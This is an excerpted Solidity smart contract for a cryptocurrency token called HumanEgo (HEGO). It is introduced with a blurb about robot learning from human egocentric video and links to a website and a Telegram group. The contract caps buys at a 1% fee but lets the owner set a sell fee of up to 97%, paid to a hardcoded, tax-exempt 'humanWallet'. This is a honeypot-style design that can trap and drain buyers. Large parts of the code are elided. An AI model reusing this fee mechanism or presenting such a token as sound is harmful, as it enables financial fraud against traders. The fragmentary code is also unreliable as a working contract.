...
Human egocentric video captures rich manipulation demonstrations without any robot hardware, 
yet transferring these skills to robots remains challenging due to the embodiment gap between human and robot in both visual appearance and kinematics

Website  : https://humanego-ai.github.io/
Telegram : https://t.me/HumanEgo_AI
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function reduceAllowance(
        ...
        require(
            ...
            "ERC20: Reduce allowance below zero"
        );
        unchecked {
...
contract HEGO is ERC20, Ownable {
    ...
    //Anti-whale
    bool private enableLimits = true;
    uint256 private maximumWallet;
    ...
    event MaximumWalletUpdated(uint256 maximumWallet);

    event humanWalletUpdated(
    ...
    constructor() ERC20("HumanEgo", "HEGO") {
        ...
        maximumWallet = (_totalSupply * 20) / 1000;

        swapBackValueMin = (_totalSupply * 1) / 1000;
        swapBackValueMax = (_totalSupply * 2) / 100;

        humanWallet = address(0x07b67a4c2DF7618c77310EE73F7e53A72f9465ba);
        ...
        taxesSwap_setExcluded(humanWallet, true);
        ...
        limitsAntiWhale_setExcluded(humanWallet, true);
     ...
     * @dev onlyOwner.
     * Emits an {MaximumWalletUpdated} event
     * @param _limitWalletNew Base 1000, so 1% = 10
     */
    function limitsAntiWhale_walletLimit_set(
        uint256 _limitWalletNew
    ) external onlyOwner {
        require(_limitWalletNew >= 5, "Cannot set maximumWallet lower than 0.5%");
        maximumWallet = (_limitWalletNew * totalSupply()) / 1000;
        emit MaximumWalletUpdated(maximumWallet);
    }
     ...
     */
    function swapBuyTax(uint256 _newSwapTax) external onlyOwner {
        buyFeeTotal = _newSwapTax;
        require(buyFeeTotal <= 1, "Total buy fee cannot be higher than 1%");
        emit BuyFeeUpdated(buyFeeTotal, buyFeeTotal, buyFeeTotal);
    }
     ...
     * @param _newSwapTax The fee for the marketing wallet
     */
    function swapSellTax(uint256 _newSwapTax) external onlyOwner {
        sellFeeTotal = _newSwapTax;
        require(
            sellFeeTotal <= 97,
            "The Selling fee cannot be higher than 97%"
        );
        emit SellFeeUpdated(sellFeeTotal, sellFeeTotal, sellFeeTotal);
    }

    function swapTransferTax(uint256 _newSwapTax) external onlyOwner {
        transferTaxTotal = _newSwapTax;
        require(
            transferTaxTotal <= 0,
            "Total transfer fee cannot be higher than 0%"
        );
    }
     ...
     * @return  _enableLimits  if the wallet limits are in effect
     * @return  _maximumWallet  The maximum amount of tokens that can be held by a wallet
    ...
    function limitsAntiWhale_infoV()
        external
        view
        returns (bool _enableLimits, uint256 _maximumWallet, uint256 _maxTx)
    {
        _enableLimits = enableLimits;
        _maximumWallet = maximumWallet;
        _maxTx = maxTx;
    }

    /**
     * @notice The wallets that receive the collected fees
     * @return _humanWallet The wallet that receives the marketing fees
     */
    function receiver_info()
        external
        view
        returns (address _humanWallet)
    {
        return (humanWallet);
    }
     ...
     * @return _buyFeeTotal The total fee for buys
     * @return _sellFeeTotal The total fee for sells
    ...
    function taxes_info()
        ...
        view
        returns (
            uint256 _buyFeeTotal,
            uint256 _sellFeeTotal,
            uint256 _transferTaxTotal
        )
    {
        _buyFeeTotal = buyFeeTotal;
        _sellFeeTotal = sellFeeTotal;
        ...
        if (enableLimits) {
            if (
                ...
                if (
                    ...
                    require(
                        amount + balanceOf(to) <= maximumWallet,
                        "Max wallet exceeded"
                    );
                }
                //when sell
    ...
    function swapBack(uint256 amount) private {
        ...
        (success, ) = address(humanWallet).call{
